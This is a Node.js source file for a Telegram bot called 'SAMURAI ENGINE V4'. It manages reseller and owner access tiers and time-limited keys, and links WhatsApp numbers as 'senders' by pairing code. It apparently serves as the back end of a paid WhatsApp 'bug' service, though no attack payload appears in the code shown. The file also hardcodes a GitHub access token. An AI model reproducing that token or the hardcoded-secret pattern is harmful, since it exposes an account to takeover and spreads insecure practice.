const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch");
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@otaxayun/baileys');

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); 
let userApiBug = null;
let sock;


function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  let data = JSON.parse(fs.readFileSync(file));

  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}


function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addreseller <id>");

  const data = loadAkses();
  if (data.resellers.includes(id)) return ctx.reply("✗ Already a reseller.");

  data.resellers.push(id);
  saveAkses(data);
  ctx.reply(`✓ Reseller added: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

bot.command("addpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addpt <id>");

  const data = loadAkses();
  if (data.pts.includes(id)) return ctx.reply("✗ Already PT.");

  data.pts.push(id);
  saveAkses(data);
  ctx.reply(`✓ PT added: ${id}`);
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

bot.command("addmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addmod <id>");

  const data = loadAkses();
  if (data.moderators.includes(id)) return ctx.reply("✗ Already Moderator.");

  data.moderators.push(id);
  saveAkses(data);
  ctx.reply(`✓ Moderator added: ${id}`);
});

bot.command("delmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delmod <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Moderator removed: ${id}`);
});

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          sessions.set(BotNumber, userSock);
          
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          const userSessions = loadUserSessions();
  if (!userSessions[username]) {
    userSessions[username] = [];
  }
  if (!userSessions[username].includes(BotNumber)) {
    userSessions[username].push(BotNumber);
    saveUserSessions(userSessions);
    console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
  }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

async function safeEdit(ctx, text, markup) {
  try {
    if (ctx.update.callback_query?.message?.message_id) {
      return await ctx.editMessageText(text, {
        parse_mode: "HTML",
        reply_markup: markup,
      });
    } else {
      return await ctx.reply(text, {
        parse_mode: "HTML",
        reply_markup: markup,
      });
    }
  } catch (err) {
    console.error("Error in safeEdit:", err.message);
    try {
      return await ctx.reply(text, {
        parse_mode: "HTML",
        reply_markup: markup,
      });
    } catch (fallbackErr) {
      console.error("Fallback juga gagal:", fallbackErr.message);
      return null;
    }
  }
}

bot.start(async (ctx) => {
  try {
    const username = ctx.from.username || ctx.from.first_name || "User";

    const caption = `<blockquote>(⸙) SAMURAI ENGINE V4</blockquote>
<i>Now FlowX has been updated</i>
<i>Latest styles, more tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Author :</b> @luxzyhalmer
<b>Version :</b> 4 ⧸ <code>IIII</code>
<b>Username :</b> ${username}

<i>Pilih menu di bawah:</i>`;

    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/a7lbg1.jpg" },
      {
        caption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "cɾεαƭ ɱεɳµ", callback_data: "menu_create" },
              { text: "αccεร ɱεɳµ", callback_data: "menu_access" }
            ],
            [
              { text: "ɓσƭ เɳƒσ", callback_data: "menu_info" },
              { text: "cɦαƭ ɱεɳµ", callback_data: "menu_chat" }
            ],
            [
              { text: "ƒσℓℓσω", callback_data: "menu_channel" }
            ]
          ]
        }
      }
    );
  } catch (err) {
    console.error("Error in start command:", err.message);
    await ctx.reply("❌ Terjadi error saat memulai bot. Silakan coba lagi.");
  }
});

bot.action("menu_create", async (ctx) => {
  try {
    const text = `<blockquote>(⸙) CREATE MENU</blockquote>
<i>Menu untuk membuat sesuatu</i>

<b>CREATE OPTIONS</b>
• /create1
• /create2
• /create3
• /create4

<i>Pilih opsi di atas untuk membuat sesuatu yang baru.</i>`;

    await safeEdit(ctx, text, {
      inline_keyboard: [
        [{ text: "αµƭɦσɾ", url: "https://t.me/AzkaOffcial" }],
        [{ text: "ҡεɱɓαℓเ", callback_data: "back_home" }]
      ]
    });
  } catch (err) {
    console.error("Error in menu_create:", err.message);
  }
  
  try {
    await ctx.answerCbQuery();
  } catch (e) {
  }
});

bot.action("menu_access", async (ctx) => {
  try {
    const text = `<blockquote>(⸙) SAMURAI ENGINE V4</blockquote>
<i>This is the menu to take user access</i>

<b>ACCES MENU</b>
• /addacces  
• /delacces  
• /addowner  
• /delowner  
• /addreseller  
• /delreseller  
• /addpt  
• /delpt  
• /addmod  
• /delmod`;

    await safeEdit(ctx, text, {
      inline_keyboard: [
        [{ text: "αµƭɦσɾ", url: "https://t.me/AzkaOffcial" }],
        [{ text: "ҡεɱɓαℓเ", callback_data: "back_home" }]
      ]
    });
  } catch (err) {
    console.error("Error in menu_access:", err.message);
  }
  
  try {
    await ctx.answerCbQuery();
  } catch (e) {
  }
});

bot.action("menu_info", async (ctx) => {
  try {
    const text = `<blockquote>(⸙) BOT INFORMATION</blockquote>
<b>SAMURAI ENGINE V4</b>
<i>Advanced multi-functional bot with enhanced security features and updated tools.</i>

<b>🔧 Features:</b>
• User Management  
• Access Control  
• Multi-tool Integration  
• Secure Operations  

<b>📞 Support:</b> @luxzyhalmer`;

    await safeEdit(ctx, text, {
      inline_keyboard: [
        [{ text: "αµƭɦσɾ", url: "https://t.me/AzkaOffcial" }],
        [{ text: "ҡεɱɓαℓเ", callback_data: "back_home" }]
      ]
    });
  } catch (err) {
    console.error("Error in menu_info:", err.message);
  }
  
  try {
    await ctx.answerCbQuery();
  } catch (e) {
  }
});

bot.action("menu_chat", async (ctx) => {
  try {
    await safeEdit(ctx, "💬 αµƭɦσɾ : https://t.me/AzkaOffcial", {
      inline_keyboard: [
        [{ text: "ҡεɱɓαℓเ", callback_data: "back_home" }]
      ]
    });
  } catch (err) {
    console.error("Error in menu_chat:", err.message);
  }
  
  try {
    await ctx.answerCbQuery();
  } catch (e) {
  }
});

bot.action("menu_channel", async (ctx) => {
  try {
    await safeEdit(ctx, "📢 cɦαɳɳεℓ : https://t.me/popenjoye", {
      inline_keyboard: [
        [{ text: "ҡεɱɓαℓเ", callback_data: "back_home" }]
      ]
    });
  } catch (err) {
    console.error("Error in menu_channel:", err.message);
  }
  
  try {
    await ctx.answerCbQuery();
  } catch (e) {
  }
});

bot.action("back_home", async (ctx) => {
  try {
    const username = ctx.from.username || ctx.from.first_name || "User";

    const text = `<blockquote>(⸙) FLOWX INFINITE V4</blockquote>
<i>Now FlowX has been updated</i>
<i>Latest styles, more tools, and improved security system</i>

<b>Author :</b> @luxzyhalmer  
<b>Version :</b> 4 ⧸ <code>IIII</code>  
<b>Username :</b> ${username}

<i>Pilih menu di bawah:</i>`;

    await safeEdit(ctx, text, {
      inline_keyboard: [
        [
          { text: "cɾεαƭ ɱεɳµ", callback_data: "menu_create" },
          { text: "αccεร ɱεɳµ", callback_data: "menu_access" }
        ],
        [
          { text: "ɓσƭ เɳƒσ", callback_data: "menu_info" },
          { text: "cɦαƭ ɱεɳµ", callback_data: "menu_chat" }
        ],
        [
          { text: "ƒσℓℓσω", callback_data: "menu_channel" }
        ]
      ]
    });
  } catch (err) {
    console.error("Error in back_home:", err.message);
  }
  
  try {
    await ctx.answerCbQuery();
  } catch (e) {
  }
});

const MEK_TOKEN = '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';
const GITHUB_STORAGE = 'dirgaxnx/Upload';
const BRANCH = 'main';

bot.command("uploadgithub", async (ctx) => {

    const msg = ctx.message;
    const userId = msg.from.id;
    const chatId = msg.chat.id;

    if (!msg.reply_to_message) {
        return ctx.reply("Reply ke gambar/video dengan /uploadgithub");
    }

    const replied = msg.reply_to_message;

    if (!replied.photo && !replied.video) {
        return ctx.reply("Reply hanya untuk gambar atau video.");
    }

    try {
        await ctx.reply("Uploading...");

        let fileId, mimeType;

        if (replied.photo) {
            fileId = replied.photo[replied.photo.length - 1].file_id;
            mimeType = "image/jpeg";
        } else {
            fileId = replied.video.file_id;
            mimeType = "video/mp4";
        }

        const ext = mimeType.includes("image") ? "jpg" : "mp4";
        const fileName = `${mimeType.includes("image") ? "photo" : "video"}_${Date.now()}.${ext}`;

        const fileLink = await ctx.telegram.getFileLink(fileId);

        const downloaded = await axios.get(fileLink.href, {
            responseType: "arraybuffer"
        });

        const fileBuffer = Buffer.from(downloaded.data);
        const base64 = fileBuffer.toString("base64");

        const upload = await axios.put(
            `https://api.github.com/repos/${GITHUB_STORAGE}/contents/${fileName}`,
            {
                message: `Upload ${fileName} via Telegram Bot`,
                content: base64,
                branch: BRANCH
            },
            {
                headers: {
                    "Authorization": `token ${MEK_TOKEN}`,
                    "Content-Type": "application/json",
                    "Accept": "application/vnd.github.v3+json"
                }
            }
        );

        const downloadUrl = upload.data.content.download_url;

        await ctx.reply(`🚀 Berhasil diunggah!\n\nURL: ${downloadUrl}`, {
            reply_to_message_id: replied.message_id
        });

    } catch (error) {
        console.error("UPLOAD ERROR:", error.response?.data || error.message);

        let err = "Upload gagal. ";

        if (error.response?.status === 401) err += "Token GitHub salah / tidak punya izin.";
        else if (error.response?.status === 404) err += "Repositori tidak ditemukan / branch salah.";
        else if (error.response?.status === 422) err += "File terlalu besar / base64 salah (422).";
        else err += "Kesalahan tidak diketahui.";

        await ctx.reply(err);
    }
});

bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("addkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const usernameTG = ctx.from.username || null;

  if (!usernameTG) {
    return ctx.reply(
      "⸙ Anda belum memulai bot.\n\nKlik tombol di bawah untuk memulai.",
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "⸙ START BOT", url: `https://t.me/${ctx.botInfo.username}` }]
          ]
        }
      }
    );
  }

  if (!isAuthorized(userId)) {
    return ctx.reply(
      "❌ Anda belum terdaftar sebagai user yang memiliki akses.\n\n" +
      "Silakan hubungi admin untuk mendapatkan akses."
    );
  }

  const args = ctx.message.text.split(" ")[1];

  if (!args || !args.includes(",")) {
    return ctx.reply(
      "✗ Format salah!\n\nExample:\n• /addkey namauser,1d\n• /addkey namauser,1d,customkey",
      { parse_mode: "HTML" }
    );
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) {
    return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");
  }

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);

  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  try {
    await bot.telegram.sendMessage(
      userId,
      `✓ <b>Key berhasil dibuat:</b>\n\n` +
      `<b>Username:</b> <code>${username}</code>\n` +
      `<b>Key:</b> <code>${key}</code>\n` +
      `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply("⚠️ Gagal mengirim ke private chat.\nPastikan Anda sudah /start bot di private chat.");
  }

  return ctx.reply("🔐 Key berhasil dibuat!\nSilakan cek private chat untuk detail lengkap.");
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey shin");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

